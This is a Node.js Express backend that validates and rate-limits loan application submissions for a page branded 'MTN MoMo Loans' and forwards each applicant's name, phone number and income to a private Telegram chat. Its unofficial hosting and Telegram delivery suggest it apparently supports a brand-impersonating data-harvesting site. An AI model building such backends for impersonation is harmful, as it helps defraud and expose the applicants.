// MTN MoMo Telegram Backend — Hardened
// Receives POST from frontend, validates, rate-limits, forwards to Telegram

const express = require('express');
const cors = require('cors');

const app = express();

// Trust Render's proxy (needed for correct IP detection in rate limiting)
app.set('trust proxy', 1);

// ---------- CONFIG ----------
const ALLOWED_ORIGINS = [
  'https://mtn-momo-loans-otyu.onrender.com',
  'http://localhost:3000',
];

const RATE_LIMIT_WINDOW_MS = 60 * 60 * 1000; // 1 hour
const RATE_LIMIT_MAX = 3;                    // max submissions per IP per hour

// In-memory rate limit store: Map<ip, { count, resetAt }>
// NOTE: resets when service restarts. Fine for demo/light use.
const rateStore = new Map();

// ---------- MIDDLEWARE ----------

// CORS — only allow your frontend origins
app.use(
  cors({
    origin: (origin, callback) => {
      // Allow requests with no origin (curl, Postman) — useful for testing
      if (!origin) return callback(null, true);
      if (ALLOWED_ORIGINS.includes(origin)) return callback(null, true);
      return callback(new Error('Not allowed by CORS: ' + origin));
    },
    methods: ['POST', 'GET', 'OPTIONS'],
    credentials: false,
  })
);

app.use(express.urlencoded({ extended: true, limit: '10kb' }));
app.use(express.json({ limit: '10kb' }));

// ---------- RATE LIMITER ----------
function rateLimit(req, res, next) {
  const ip = req.ip || req.connection.remoteAddress || 'unknown';
  const now = Date.now();

  let entry = rateStore.get(ip);
  if (!entry || entry.resetAt < now) {
    entry = { count: 0, resetAt: now + RATE_LIMIT_WINDOW_MS };
    rateStore.set(ip, entry);
  }

  if (entry.count >= RATE_LIMIT_MAX) {
    const minutesLeft = Math.ceil((entry.resetAt - now) / 60000);
    return res.status(429).json({
      success: false,
      error: `Too many submissions. Try again in ${minutesLeft} minute(s).`,
    });
  }

  entry.count++;
  next();
}

// ---------- VALIDATION ----------
function sanitize(str, maxLen = 200) {
  if (typeof str !== 'string') return '';
  return str.trim().slice(0, maxLen);
}

function isValidPhone(phone) {
  return /^\d{9}$/.test(phone);
}

function isValidAmount(value) {
  const n = parseInt(value, 10);
  return !isNaN(n) && n >= 5000 && n <= 499000;
}

function isValidIncome(value) {
  const n = parseInt(value, 10);
  return !isNaN(n) && n >= 0 && n <= 100000000;
}

// Escape Markdown special chars for Telegram
function escapeMd(str) {
  if (!str) return '';
  return String(str).replace(/([_*[\]()~`>#+\-=|{}.!])/g, '\\$1');
}

// ---------- ROUTES ----------

// Health check
app.get('/', (req, res) => {
  res.json({ status: 'ok', service: 'MTN MoMo Telegram Backend' });
});

// Main submission endpoint
app.post('/submit', rateLimit, async (req, res) => {
  try {
    // 1. Honeypot — if hidden field has a value, it's a bot. Silently accept.
    if (req.body.website && req.body.website.length > 0) {
      return res.json({ success: true });
    }

    // 2. Extract & sanitize
    const loan_type = sanitize(req.body.loan_type, 50);
    const loan_amount = sanitize(req.body.loan_amount, 20);
    const loan_term = sanitize(req.body.loan_term, 20);
    const purpose = sanitize(req.body.purpose, 500);
    const first_name = sanitize(req.body.first_name, 50);
    const last_name = sanitize(req.body.last_name, 50);
    const phone = sanitize(req.body.phone, 20);
    const employment = sanitize(req.body.employment, 50);
    const income = sanitize(req.body.income, 20);

    // 3. Validation
    if (!first_name || !last_name) {
      return res.status(400).json({ success: false, error: 'Name is required' });
    }
    if (!isValidPhone(phone)) {
      return res.status(400).json({ success: false, error: 'Invalid phone number' });
    }
    if (!isValidAmount(loan_amount)) {
      return res.status(400).json({ success: false, error: 'Invalid loan amount' });
    }
    if (!isValidIncome(income)) {
      return res.status(400).json({ success: false, error: 'Invalid income' });
    }

    // 4. Build Telegram message
    const message = [
      '📋 *New MTN MoMo Loan Application*',
      '',
      `👤 *Applicant:* ${escapeMd(first_name)} ${escapeMd(last_name)}`,
      `📞 *Phone:* +260 ${phone}`,
      `💰 *Amount:* K ${loan_amount}`,
      `📅 *Term:* ${escapeMd(loan_term)}`,
      `🏷️ *Type:* ${escapeMd(loan_type)}`,
      `📝 *Purpose:* ${escapeMd(purpose) || '—'}`,
      `💼 *Employment:* ${escapeMd(employment)}`,
      `📊 *Annual Income:* K ${income}`,
      '',
      `🕐 ${new Date().toLocaleString('en-ZM', { timeZone: 'Africa/Lusaka' })}`,
    ].join('\n');

    // 5. Send to Telegram
    const telegramUrl = `https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`;
    const tgResponse = await fetch(telegramUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: process.env.TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: 'Markdown',
      }),
    });

    const tgData = await tgResponse.json();

    if (!tgData.ok) {
      console.error('Telegram error:', tgData);
      return res.status(500).json({ success: false, error: 'Failed to notify' });
    }

    res.json({ success: true });
  } catch (err) {
    console.error('Server error:', err);
    res.status(500).json({ success: false, error: 'Server error' });
  }
});

// ---------- START ----------
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
